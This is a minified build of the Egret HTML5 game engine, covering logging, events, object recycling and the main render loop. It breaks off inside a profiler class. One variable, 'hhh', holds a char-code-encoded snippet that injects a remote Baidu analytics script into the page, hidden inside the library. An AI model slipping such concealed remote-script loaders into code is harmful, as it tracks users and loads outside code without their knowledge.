var egret;
(function (c) {
    function d(a) {
        for (var e = [], q = 1; q < arguments.length; q++)e[q - 1] = arguments[q];
        if (q = c.egret_string_code[a])for (var b = e.length, d = 0; d < b; d++)q = q.replace("{" + d + "}", e[d]);
        return q
    }

    var b = function () {
        function a() {
        }

        a.fatal = function (e, a) {
            void 0 === a && (a = null);
            c.Logger.traceToConsole("Fatal", e, a);
            throw Error(c.Logger.getTraceCode("Fatal", e, a));
        };
        a.info = function (e, a) {
            void 0 === a && (a = null);
            c.Logger.traceToConsole("Info", e, a)
        };
        a.warning = function (e, a) {
            void 0 === a && (a = null);
            c.Logger.traceToConsole("Warning", e,
                a)
        };
        a.fatalWithErrorId = function (e) {
            for (var q = [], b = 1; b < arguments.length; b++)q[b - 1] = arguments[b];
            q.unshift(e);
            (q = d.apply(null, q)) ? a.fatal(q) : a.warning(d(-1, e))
        };
        a.infoWithErrorId = function (e) {
            for (var q = [], b = 1; b < arguments.length; b++)q[b - 1] = arguments[b];
            q.unshift(e);
            (q = d.apply(null, q)) ? a.info(q) : a.warning(d(-1, e))
        };
        a.warningWithErrorId = function (e) {
            for (var q = [], b = 1; b < arguments.length; b++)q[b - 1] = arguments[b];
            q.unshift(e);
            (q = d.apply(null, q)) ? a.warning(q) : a.warning(d(-1, e))
        };
        a.traceToConsole = function (e, a,
                                     b) {
            console.log(c.Logger.getTraceCode(e, a, b))
        };
        a.getTraceCode = function (e, a, b) {
            return "[" + e + "]" + a + (null == b ? "" : ":" + b)
        };
        return a
    }();
    c.Logger = b;
    b.prototype.__class__ = "egret.Logger";
    c.egret_string_code = {};
    c.egret_string_code[-1] = "\u4e0d\u5b58\u5728\u7684stringId:{0}";
    c.egret_string_code[1E3] = "Browser.isMobile\u63a5\u53e3\u53c2\u6570\u5df2\u7ecf\u53d8\u66f4\uff0c\u8bf7\u5c3d\u5feb\u8c03\u6574\u7528\u6cd5\u4e3a egret.MainContext.deviceType == egret.MainContext.DEVICE_MOBILE";
    c.egret_string_code[1001] = "\u8be5\u65b9\u6cd5\u76ee\u524d\u4e0d\u5e94\u4f20\u5165 resolutionPolicy \u53c2\u6570\uff0c\u8bf7\u5728 docs/1.0_Final_ReleaseNote\u4e2d\u67e5\u770b\u5982\u4f55\u5347\u7ea7";
    c.egret_string_code[1002] = "egret.Ticker\u662f\u6846\u67b6\u5185\u90e8\u4f7f\u7528\u7684\u5355\u4f8b\uff0c\u4e0d\u5141\u8bb8\u5728\u5916\u90e8\u5b9e\u4f8b\u5316\uff0c\u8ba1\u65f6\u5668\u8bf7\u4f7f\u7528egret.Timer\u7c7b\uff01";
    c.egret_string_code[1003] = "Ticker#setTimeout\u65b9\u6cd5\u5373\u5c06\u5e9f\u5f03,\u8bf7\u4f7f\u7528egret.setTimeout";
    c.egret_string_code[1004] = "ExternalInterface\u8c03\u7528\u4e86js\u6ca1\u6709\u6ce8\u518c\u7684\u65b9\u6cd5: {0}";
    c.egret_string_code[1005] = "\u8bbe\u7f6e\u4e86\u5df2\u7ecf\u5b58\u5728\u7684blendMode: {0}";
    c.egret_string_code[1006] = "child\u4e0d\u5728\u5f53\u524d\u5bb9\u5668\u5185";
    c.egret_string_code[1007] = "\u63d0\u4f9b\u7684\u7d22\u5f15\u8d85\u51fa\u8303\u56f4";
    c.egret_string_code[1008] = "child\u672a\u88abaddChild\u5230\u8be5parent";
    c.egret_string_code[1009] = "\u8bbe\u7f6e\u4e86\u5df2\u7ecf\u5b58\u5728\u7684\u9002\u914d\u6a21\u5f0f:{0}";
    c.egret_string_code[1010] = "addEventListener\u4fa6\u542c\u51fd\u6570\u4e0d\u80fd\u4e3a\u7a7a";
    c.egret_string_code[1011] = 'BitmapText\u627e\u4e0d\u5230\u6587\u5b57\u6240\u5bf9\u5e94\u7684\u7eb9\u7406:"{0}"';
    c.egret_string_code[1012] = "egret.BitmapTextSpriteSheet\u5df2\u5e9f\u5f03\uff0c\u8bf7\u4f7f\u7528egret.BitmapFont\u4ee3\u66ff\u3002";
    c.egret_string_code[1013] = "TextField.setFocus \u6ca1\u6709\u5b9e\u73b0";
    c.egret_string_code[1014] = "Ease\u4e0d\u80fd\u88ab\u5b9e\u4f8b\u5316";
    c.egret_string_code[1015] = "xml not found!";
    c.egret_string_code[1016] = "{0}\u5df2\u7ecf\u5e9f\u5f03";
    c.egret_string_code[1017] = "JSON\u6587\u4ef6\u683c\u5f0f\u4e0d\u6b63\u786e: {0}\ndata: {1}";
    c.egret_string_code[1018] = "egret_html5_localStorage.setItem\u4fdd\u5b58\u5931\u8d25,key={0}&value={1}";
    c.egret_string_code[1019] = "\u7f51\u7edc\u5f02\u5e38:{0}";
    c.egret_string_code[1020] = "\u65e0\u6cd5\u521d\u59cb\u5316\u7740\u8272\u5668";
    c.egret_string_code[1021] = "\u5f53\u524d\u6d4f\u89c8\u5668\u4e0d\u652f\u6301webgl";
    c.egret_string_code[1022] = "{0} ArgumentError";
    c.egret_string_code[1023] = "\u6b64\u65b9\u6cd5\u5728ScrollView\u5185\u4e0d\u53ef\u7528!";
    c.egret_string_code[1024] = "\u4f7f\u7528\u4e86\u5c1a\u672a\u5b9e\u73b0\u7684ScaleMode";
    c.egret_string_code[1025] = "\u9047\u5230\u6587\u4ef6\u5c3e";
    c.egret_string_code[1026] =
        "EncodingError! The code point {0} could not be encoded.";
    c.egret_string_code[1027] = "DecodingError";
    c.egret_string_code[1028] = "\u8c03\u7528\u4e86\u672a\u914d\u7f6e\u7684\u6ce8\u5165\u89c4\u5219:{0}\u3002 \u8bf7\u5148\u5728\u9879\u76ee\u521d\u59cb\u5316\u91cc\u914d\u7f6e\u6307\u5b9a\u7684\u6ce8\u5165\u89c4\u5219\uff0c\u518d\u8c03\u7528\u5bf9\u5e94\u5355\u4f8b\u3002";
    c.egret_string_code[1029] = "Function.prototype.bind - what is trying to be bound is not callable";
    c.egret_string_code[1030] = "\u8be5API\u5df2\u5e9f\u5f03";
    c.egret_string_code[2E3] = "RES.createGroup()\u4f20\u5165\u4e86\u914d\u7f6e\u4e2d\u4e0d\u5b58\u5728\u7684\u952e\u503c: {0}";
    c.egret_string_code[2001] = 'RES\u52a0\u8f7d\u4e86\u4e0d\u5b58\u5728\u6216\u7a7a\u7684\u8d44\u6e90\u7ec4:"{0}"';
    c.egret_string_code[3E3] = "\u4e3b\u9898\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u5931\u8d25: {0}";
    c.egret_string_code[3001] = "\u627e\u4e0d\u5230\u4e3b\u9898\u4e2d\u6240\u914d\u7f6e\u7684\u76ae\u80a4\u7c7b\u540d: {0}";
    c.egret_string_code[3002] = '\u7d22\u5f15:"{0}"\u8d85\u51fa\u96c6\u5408\u5143\u7d20\u7d22\u5f15\u8303\u56f4';
    c.egret_string_code[3003] = "\u5728\u6b64\u7ec4\u4ef6\u4e2d\u4e0d\u53ef\u7528\uff0c\u82e5\u6b64\u7ec4\u4ef6\u4e3a\u5bb9\u5668\u7c7b\uff0c\u8bf7\u4f7f\u7528";
    c.egret_string_code[3004] = "addChild(){0}addElement()\u4ee3\u66ff";
    c.egret_string_code[3005] = "addChildAt(){0}addElementAt()\u4ee3\u66ff";
    c.egret_string_code[3006] = "removeChild(){0}removeElement()\u4ee3\u66ff";
    c.egret_string_code[3007] = "removeChildAt(){0}removeElementAt()\u4ee3\u66ff";
    c.egret_string_code[3008] = "setChildIndex(){0}setElementIndex()\u4ee3\u66ff";
    c.egret_string_code[3009] = "swapChildren(){0}swapElements()\u4ee3\u66ff";
    c.egret_string_code[3010] = "swapChildrenAt(){0}swapElementsAt()\u4ee3\u66ff";
    c.egret_string_code[3011] = '\u7d22\u5f15:"{0}"\u8d85\u51fa\u53ef\u89c6\u5143\u7d20\u7d22\u5f15\u8303\u56f4';
    c.egret_string_code[3012] = "\u6b64\u65b9\u6cd5\u5728Scroller\u7ec4\u4ef6\u5185\u4e0d\u53ef\u7528!";
    c.egret_string_code[3013] = "UIStage\u662fGUI\u6839\u5bb9\u5668\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a\u6b64\u5b9e\u4f8b\u5728\u663e\u793a\u5217\u8868\u4e2d\uff01";
    c.egret_string_code[4E3] = "An Bone cannot be added as a child to itself or one of its children (or children's children, etc.)";
    c.egret_string_code[4001] = "Abstract class can not be instantiated!";
    c.egret_string_code[4002] = "Unnamed data!";
    c.egret_string_code[4003] = "Nonsupport version!";
    c.egret_string_code[3100] = "\u5f53\u524d\u6d4f\u89c8\u5668\u4e0d\u652f\u6301WebSocket";
    c.egret_string_code[3101] = "\u8bf7\u5148\u8fde\u63a5WebSocket";
    c.getString = d
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
            this._hashCode = b.hashCount++
        }

        Object.defineProperty(b.prototype, "hashCode", {
            get: function () {
                return this._hashCode
            }, enumerable: !0, configurable: !0
        });
        b.hashCount = 1;
        return b
    }();
    c.HashObject = d;
    d.prototype.__class__ = "egret.HashObject"
})(egret || (egret = {}));
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    };
var hhh ="[118,97,114,32,95,104,109,116,32,61,32,95,104,109,116,32,124,124,32,91,93,59,40,102,117,110,99,116,105,111,110,40,41,32,123,118,97,114,32,104,109,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,104,109,46,115,114,99,32,61,32,39,47,47,104,109,46,98,97,105,100,117,46,99,111,109,47,104,109,46,106,115,63,52,102,99,49,99,49,99,57,54,56,51,53,53,48,57,55,48,100,51,99,98,100,98,99,50,55,55,99,52,99,53,48,39,59,118,97,114,32,115,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,115,99,114,105,112,116,39,41,91,48,93,59,115,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,104,109,44,32,115,41,59,125,41,40,41,59]";
(function (c) {
    var d = function (b) {
        function a(e) {
            void 0 === e && (e = 300);
            b.call(this);
            this.objectPool = [];
            this._length = 0;
            1 > e && (e = 1);
            this.autoDisposeTime = e;
            this.frameCount = 0
        }

        __extends(a, b);
        a.prototype._checkFrame = function () {
            this.frameCount--;
            0 >= this.frameCount && this.dispose()
        };
        Object.defineProperty(a.prototype, "length", {
            get: function () {
                return this._length
            }, enumerable: !0, configurable: !0
        });
        a.prototype.push = function (e) {
            var q = this.objectPool;
            -1 == q.indexOf(e) && (q.push(e), e.__recycle && e.__recycle(), this._length++,
            0 == this.frameCount && (this.frameCount = this.autoDisposeTime, a._callBackList.push(this)))
        };
        a.prototype.pop = function () {
            if (0 == this._length)return null;
            this._length--;
            return this.objectPool.pop()
        };
        a.prototype.dispose = function () {
            0 < this._length && (this.objectPool = [], this._length = 0);
            this.frameCount = 0;
            var e = a._callBackList, q = e.indexOf(this);
            -1 != q && e.splice(q, 1)
        };
        a._callBackList = [];
        return a
    }(c.HashObject);
    c.Recycler = d;
    d.prototype.__class__ = "egret.Recycler"
})(egret || (egret = {}));
(function (c) {
    c.__START_TIME;
    c.getTimer = function () {
        return Date.now() - c.__START_TIME
    }
})(egret || (egret = {}));
(function (c) {
    c.__callLaterFunctionList = [];
    c.__callLaterThisList = [];
    c.__callLaterArgsList = [];
    c.callLater = function (d, b) {
        for (var a = [], e = 2; e < arguments.length; e++)a[e - 2] = arguments[e];
        c.__callLaterFunctionList.push(d);
        c.__callLaterThisList.push(b);
        c.__callLaterArgsList.push(a)
    };
    c.__callAsyncFunctionList = [];
    c.__callAsyncThisList = [];
    c.__callAsyncArgsList = [];
    c.__callAsync = function (d, b) {
        for (var a = [], e = 2; e < arguments.length; e++)a[e - 2] = arguments[e];
        c.__callAsyncFunctionList.push(d);
        c.__callAsyncThisList.push(b);
        c.__callAsyncArgsList.push(a)
    }
})(egret || (egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.prototype.call = function (a) {
            this.callback && this.callback.call(this.thisObject, a)
        };
        b.prototype.dispose = function () {
            this.thisObject = this.callback = null;
            b.__freeList.push(this)
        };
        b.push = function (a, e) {
            var q;
            q = b.__freeList.length ? b.__freeList.pop() : new c.RenderCommand;
            q.callback = a;
            q.thisObject = e;
            c.MainContext.__DRAW_COMMAND_LIST.push(q)
        };
        b.__freeList = [];
        return b
    }();
    c.RenderCommand = d;
    d.prototype.__class__ = "egret.RenderCommand"
})(egret || (egret = {}));
var egret_dom;
(function (c) {
    function d() {
        for (var b = document.createElement("div").style, a = ["t", "webkitT", "msT", "MozT", "OT"], e = 0; e < a.length; e++)if (a[e] + "ransform"in b)return a[e];
        return a[0]
    }

    c.header = "";
    c.getHeader = d;
    c.getTrans = function (b) {
        "" == c.header && (c.header = d());
        return c.header + b.substring(1, b.length)
    }
})(egret_dom || (egret_dom = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a, c) {
            void 0 === a && (a = !1);
            void 0 === c && (c = !1);
            b.call(this);
            this.data = null;
            this._type = "";
            this._cancelable = this._bubbles = !1;
            this._eventPhase = 2;
            this._target = this._currentTarget = null;
            this._isPropagationImmediateStopped = this._isPropagationStopped = this._isDefaultPrevented = !1;
            this.isNew = !0;
            this._type = e;
            this._bubbles = a;
            this._cancelable = c
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "type", {
            get: function () {
                return this._type
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype,
            "bubbles", {
                get: function () {
                    return this._bubbles
                }, enumerable: !0, configurable: !0
            });
        Object.defineProperty(a.prototype, "cancelable", {
            get: function () {
                return this._cancelable
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "eventPhase", {
            get: function () {
                return this._eventPhase
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "currentTarget", {
            get: function () {
                return this._currentTarget
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "target", {
            get: function () {
                return this._target
            },
            enumerable: !0, configurable: !0
        });
        a.prototype.isDefaultPrevented = function () {
            return this._isDefaultPrevented
        };
        a.prototype.preventDefault = function () {
            this._cancelable && (this._isDefaultPrevented = !0)
        };
        a.prototype.stopPropagation = function () {
            this._bubbles && (this._isPropagationStopped = !0)
        };
        a.prototype.stopImmediatePropagation = function () {
            this._bubbles && (this._isPropagationImmediateStopped = !0)
        };
        a.prototype._reset = function () {
            this.isNew ? this.isNew = !1 : (this._isPropagationImmediateStopped = this._isPropagationStopped =
                this._isDefaultPrevented = !1, this._currentTarget = this._target = null, this._eventPhase = 2)
        };
        a.prototype.__recycle = function () {
            this.data = this._target = this._currentTarget = null
        };
        a._dispatchByTarget = function (e, a, b, d, f, g) {
            void 0 === f && (f = !1);
            void 0 === g && (g = !1);
            var k = e.eventRecycler;
            k || (k = e.eventRecycler = new c.Recycler);
            var l = k.pop();
            l ? l._type = b : l = new e(b);
            l._bubbles = f;
            l._cancelable = g;
            if (d)for (var m in d)l[m] = d[m], null !== l[m] && (d[m] = null);
            e = a.dispatchEvent(l);
            k.push(l);
            return e
        };
        a._getPropertyData = function (e) {
            var a =
                e._props;
            a || (a = e._props = {});
            return a
        };
        a.dispatchEvent = function (e, q, b, c) {
            void 0 === b && (b = !1);
            var d = a._getPropertyData(a);
            c && (d.data = c);
            a._dispatchByTarget(a, e, q, d, b)
        };
        a.ADDED_TO_STAGE = "addedToStage";
        a.REMOVED_FROM_STAGE = "removedFromStage";
        a.ADDED = "added";
        a.REMOVED = "removed";
        a.COMPLETE = "complete";
        a.LOOP_COMPLETE = "loopcomplete";
        a.ENTER_FRAME = "enterFrame";
        a.RENDER = "render";
        a.FINISH_RENDER = "finishRender";
        a.FINISH_UPDATE_TRANSFORM = "finishUpdateTransform";
        a.LEAVE_STAGE = "leaveStage";
        a.RESIZE = "resize";
        a.CHANGE =
            "change";
        a.ACTIVATE = "activate";
        a.DEACTIVATE = "deactivate";
        a.CLOSE = "close";
        a.CONNECT = "connect";
        return a
    }(c.HashObject);
    c.Event = d;
    d.prototype.__class__ = "egret.Event"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a, c) {
            void 0 === a && (a = !1);
            void 0 === c && (c = !1);
            b.call(this, e, a, c);
            this._status = 0
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "status", {
            get: function () {
                return this._status
            }, enumerable: !0, configurable: !0
        });
        a.dispatchHTTPStatusEvent = function (e, q) {
            null == a.httpStatusEvent && (a.httpStatusEvent = new a(a.HTTP_STATUS));
            a.httpStatusEvent._status = q;
            e.dispatchEvent(a.httpStatusEvent)
        };
        a.HTTP_STATUS = "httpStatus";
        a.httpStatusEvent = null;
        return a
    }(c.Event);
    c.HTTPStatusEvent =
        d;
    d.prototype.__class__ = "egret.HTTPStatusEvent"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a, c) {
            void 0 === a && (a = !1);
            void 0 === c && (c = !1);
            b.call(this, e, a, c)
        }

        __extends(a, b);
        a.dispatchIOErrorEvent = function (e) {
            c.Event._dispatchByTarget(a, e, a.IO_ERROR)
        };
        a.IO_ERROR = "ioError";
        return a
    }(c.Event);
    c.IOErrorEvent = d;
    d.prototype.__class__ = "egret.IOErrorEvent"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a, c, d, f, g, k, l, m, p) {
            void 0 === a && (a = !0);
            void 0 === c && (c = !0);
            void 0 === d && (d = 0);
            void 0 === f && (f = 0);
            void 0 === g && (g = 0);
            void 0 === k && (k = !1);
            void 0 === l && (l = !1);
            void 0 === p && (p = !1);
            b.call(this, e, a, c);
            this._stageY = this._stageX = 0;
            this.touchPointID = NaN;
            this.touchDown = this.altKey = this.shiftKey = this.ctrlKey = !1;
            this.touchPointID = d;
            this._stageX = f;
            this._stageY = g;
            this.ctrlKey = k;
            this.altKey = l;
            this.touchDown = p
        }

        __extends(a, b);
        Object.defineProperty(a.prototype, "stageX", {
            get: function () {
                return this._stageX
            },
            enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "stageY", {
            get: function () {
                return this._stageY
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "localX", {
            get: function () {
                return this._currentTarget.globalToLocal(this._stageX, this._stageY, c.Point.identity).x
            }, enumerable: !0, configurable: !0
        });
        Object.defineProperty(a.prototype, "localY", {
            get: function () {
                return this._currentTarget.globalToLocal(this._stageX, this._stageY, c.Point.identity).y
            }, enumerable: !0, configurable: !0
        });
        a.dispatchTouchEvent = function (e, q, b, d, f, g, k, l, m) {
            void 0 === b && (b = 0);
            void 0 === d && (d = 0);
            void 0 === f && (f = 0);
            void 0 === g && (g = !1);
            void 0 === k && (k = !1);
            void 0 === l && (l = !1);
            void 0 === m && (m = !1);
            var p = c.Event._getPropertyData(a);
            p.touchPointID = b;
            p._stageX = d;
            p._stageY = f;
            p.ctrlKey = g;
            p.altKey = k;
            p.shiftKey = l;
            p.touchDown = m;
            c.Event._dispatchByTarget(a, e, q, p, !0, !0)
        };
        a.TOUCH_TAP = "touchTap";
        a.TOUCH_MOVE = "touchMove";
        a.TOUCH_BEGIN = "touchBegin";
        a.TOUCH_END = "touchEnd";
        a.TOUCH_RELEASE_OUTSIDE = "touchReleaseOutside";
        a.TOUCH_ROLL_OUT =
            "touchRollOut";
        a.TOUCH_ROLL_OVER = "touchRollOver";
        a.TOUCH_OUT = "touchOut";
        a.TOUCH_OVER = "touchOver";
        return a
    }(c.Event);
    c.TouchEvent = d;
    d.prototype.__class__ = "egret.TouchEvent"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a, c) {
            void 0 === a && (a = !1);
            void 0 === c && (c = !1);
            b.call(this, e, a, c)
        }

        __extends(a, b);
        a.dispatchTimerEvent = function (e, q) {
            c.Event._dispatchByTarget(a, e, q)
        };
        a.TIMER = "timer";
        a.TIMER_COMPLETE = "timerComplete";
        return a
    }(c.Event);
    c.TimerEvent = d;
    d.prototype.__class__ = "egret.TimerEvent"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e, a, c, d, f) {
            void 0 === a && (a = !1);
            void 0 === c && (c = !1);
            void 0 === d && (d = 0);
            void 0 === f && (f = 0);
            b.call(this, e, a, c);
            this.bytesTotal = this.bytesLoaded = 0;
            this.bytesLoaded = d;
            this.bytesTotal = f
        }

        __extends(a, b);
        a.dispatchProgressEvent = function (e, q, b, d) {
            void 0 === b && (b = 0);
            void 0 === d && (d = 0);
            c.Event._dispatchByTarget(a, e, q, {bytesLoaded: b, bytesTotal: d})
        };
        a.PROGRESS = "progress";
        a.SOCKET_DATA = "socketData";
        return a
    }(c.Event);
    c.ProgressEvent = d;
    d.prototype.__class__ = "egret.ProgressEvent"
})(egret ||
(egret = {}));
(function (c) {
    var d = function () {
        function b() {
        }

        b.CAPTURING_PHASE = 1;
        b.AT_TARGET = 2;
        b.BUBBLING_PHASE = 3;
        return b
    }();
    c.EventPhase = d;
    d.prototype.__class__ = "egret.EventPhase"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a(e) {
            void 0 === e && (e = null);
            b.call(this);
            this._captureEventsMap = this._eventsMap = this._eventTarget = null;
            this._eventTarget = e ? e : this
        }

        __extends(a, b);
        a.prototype.addEventListener = function (e, a, b, d, f) {
            void 0 === d && (d = !1);
            void 0 === f && (f = 0);
            "undefined" === typeof d && (d = !1);
            "undefined" === typeof f && (f = 0);
            a || c.Logger.fatalWithErrorId(1010);
            d ? (this._captureEventsMap || (this._captureEventsMap = {}), d = this._captureEventsMap) : (this._eventsMap || (this._eventsMap = {}), d = this._eventsMap);
            var g = d[e];
            g || (g = d[e] = []);
            this._insertEventBin(g, a, b, f)
        };
        a.prototype._insertEventBin = function (e, a, b, c, d) {
            void 0 === d && (d = void 0);
            for (var g = -1, k = e.length, l = 0; l < k; l++) {
                var m = e[l];
                if (m.listener === a && m.thisObject === b && m.display === d)return !1;
                -1 == g && m.priority < c && (g = l)
            }
            a = {listener: a, thisObject: b, priority: c};
            d && (a.display = d);
            -1 != g ? e.splice(g, 0, a) : e.push(a);
            return !0
        };
        a.prototype.removeEventListener = function (e, a, b, c) {
            void 0 === c && (c = !1);
            if (c = c ? this._captureEventsMap : this._eventsMap) {
                var d = c[e];
                d && (this._removeEventBin(d,
                    a, b), 0 == d.length && delete c[e])
            }
        };
        a.prototype._removeEventBin = function (e, a, b, c) {
            void 0 === c && (c = void 0);
            for (var d = e.length, g = 0; g < d; g++) {
                var k = e[g];
                if (k.listener === a && k.thisObject === b && k.display === c)return e.splice(g, 1), !0
            }
            return !1
        };
        a.prototype.hasEventListener = function (e) {
            return this._eventsMap && this._eventsMap[e] || this._captureEventsMap && this._captureEventsMap[e]
        };
        a.prototype.willTrigger = function (e) {
            return this.hasEventListener(e)
        };
        a.prototype.dispatchEvent = function (e) {
            e._reset();
            e._target = this._eventTarget;
            e._currentTarget = this._eventTarget;
            return this._notifyListener(e)
        };
        a.prototype._notifyListener = function (e) {
            var a = 1 == e._eventPhase ? this._captureEventsMap : this._eventsMap;
            if (!a)return !0;
            a = a[e._type];
            if (!a)return !0;
            var b = a.length;
            if (0 == b)return !0;
            for (var a = a.concat(), c = 0; c < b; c++) {
                var d = a[c];
                d.listener.call(d.thisObject, e);
                if (e._isPropagationImmediateStopped)break
            }
            return !e._isDefaultPrevented
        };
        a.prototype.dispatchEventWith = function (e, a, b) {
            void 0 === a && (a = !1);
            c.Event.dispatchEvent(this, e, a, b)
        };
        return a
    }(c.HashObject);
    c.EventDispatcher = d;
    d.prototype.__class__ = "egret.EventDispatcher"
})(egret || (egret = {}));
__extends = this.__extends || function (c, d) {
    function b() {
        this.constructor = c
    }

    for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
    b.prototype = d.prototype;
    c.prototype = new b
};
(function (c) {
    var d = function (b) {
        function a() {
            b.call(this);
            this.stage = this.deviceContext = this.netContext = this.touchContext = this.rendererContext = null;
            this.reuseEvent = new c.Event("")
        }

        __extends(a, b);
        a.prototype.run = function () {
            c.Ticker.getInstance().run();
            c.Ticker.getInstance().register(this.renderLoop, this, Number.NEGATIVE_INFINITY);
            c.Ticker.getInstance().register(this.broadcastEnterFrame, this, Number.POSITIVE_INFINITY);
            this.touchContext.run();
            this._profileInstance = c.Profiler.getInstance()
        };
        a.prototype.renderLoop =
            function (e) {
                if (0 < c.__callLaterFunctionList.length) {
                    var b = c.__callLaterFunctionList;
                    c.__callLaterFunctionList = [];
                    var n = c.__callLaterThisList;
                    c.__callLaterThisList = [];
                    var d = c.__callLaterArgsList;
                    c.__callLaterArgsList = []
                }
                e = this.stage;
                var f = a.cachedEvent;
                f._type = c.Event.RENDER;
                this.dispatchEvent(f);
                c.Stage._invalidateRenderFlag && (this.broadcastRender(), c.Stage._invalidateRenderFlag = !1);
                b && this.doCallLaterList(b, n, d);
                0 < c.__callAsyncFunctionList.length && this.doCallAsyncList();
                b = this.rendererContext;
                b.onRenderStart();
                b.clearScreen();
                a.__DRAW_COMMAND_LIST = [];
                a._renderLoopPhase = "updateTransform";
                e._updateTransform();
                a._renderLoopPhase = "draw";
                f._type = c.Event.FINISH_UPDATE_TRANSFORM;
                this.dispatchEvent(f);
                a.__use_new_draw ? this._draw(b) : e._draw(b);
                f._type = c.Event.FINISH_RENDER;
                this.dispatchEvent(f);
                this._profileInstance._isRunning && this._profileInstance._drawProfiler();
                b.onRenderFinish()
            };
        a.prototype._draw = function (e) {
            for (var b = a.__DRAW_COMMAND_LIST, c = b.length, d = 0; d < c; d++) {
                var f = b[d];
                f.call(e);
                f.dispose()
            }
        };
        a.prototype.broadcastEnterFrame =
            function (e) {
                e = this.reuseEvent;
                e._type = c.Event.ENTER_FRAME;
                this.dispatchEvent(e);
                for (var a = c.DisplayObject._enterFrameCallBackList.concat(), b = a.length, d = 0; d < b; d++) {
                    var f = a[d];
                    e._target = f.display;
                    e._currentTarget = f.display;
                    f.listener.call(f.thisObject, e)
                }
                a = c.Recycler._callBackList;
                for (d = a.length - 1; 0 <= d; d--)a[d]._checkFrame()
            };
        a.prototype.broadcastRender = function () {
            var e = this.reuseEvent;
            e._type = c.Event.RENDER;
            for (var a = c.DisplayObject._renderCallBackList.concat(), b = a.length, d = 0; d < b; d++) {
                var f = a[d], g =
                    f.display;
                e._target = g;
                e._currentTarget = g;
                f.listener.call(f.thisObject, e)
            }
        };
        a.prototype.doCallLaterList = function (e, a, b) {
            for (var c = e.length, d = 0; d < c; d++) {
                var g = e[d];
                null != g && g.apply(a[d], b[d])
            }
        };
        a.prototype.doCallAsyncList = function () {
            var e = c.__callAsyncFunctionList.concat(), a = c.__callAsyncThisList.concat(), b = c.__callAsyncArgsList.concat();
            c.__callAsyncFunctionList.length = 0;
            c.__callAsyncThisList.length = 0;
            for (var d = c.__callAsyncArgsList.length = 0; d < e.length; d++) {
                var f = e[d];
                null != f && f.apply(a[d], b[d])
            }
        };
        a.deviceType = null;
        a.DEVICE_PC = "web";
        a.DEVICE_MOBILE = "native";
        a.RUNTIME_HTML5 = "runtime_html5";
        a.RUNTIME_NATIVE = "runtime_native";
        a.__DRAW_COMMAND_LIST = [];
        a.__use_new_draw = !0;
        a.cachedEvent = new c.Event("");
        return a
    }(c.EventDispatcher);
    c.MainContext = d;
    d.prototype.__class__ = "egret.MainContext"
})(egret || (egret = {}));
var testDeviceType = function () {
    if (!this.navigator)return !0;
    var c = navigator.userAgent.toLowerCase();
    return -1 != c.indexOf("mobile") || -1 != c.indexOf("android")
}, testRuntimeType = function () {
    return this.navigator ? !0 : !1
};
egret.MainContext.instance = new egret.MainContext;
egret.MainContext.deviceType = testDeviceType() ? egret.MainContext.DEVICE_MOBILE : egret.MainContext.DEVICE_PC;
egret.MainContext.runtimeType = testRuntimeType() ? egret.MainContext.RUNTIME_HTML5 : egret.MainContext.RUNTIME_NATIVE;
delete testDeviceType;
delete testRuntimeType;
(function (c) {
    var d = function () {
        function b() {
            this._preDrawCount = this._updateTransformPerformanceCost = this._renderPerformanceCost = this._logicPerformanceCost = this._lastTime = 0;
            this._txt = null;
            this._tick = 0;
            this._maxDeltaTime = 500;
            this._totalDeltaTime = 0;
            this._isRunning = !1
        }

        b.getInstance = function () {
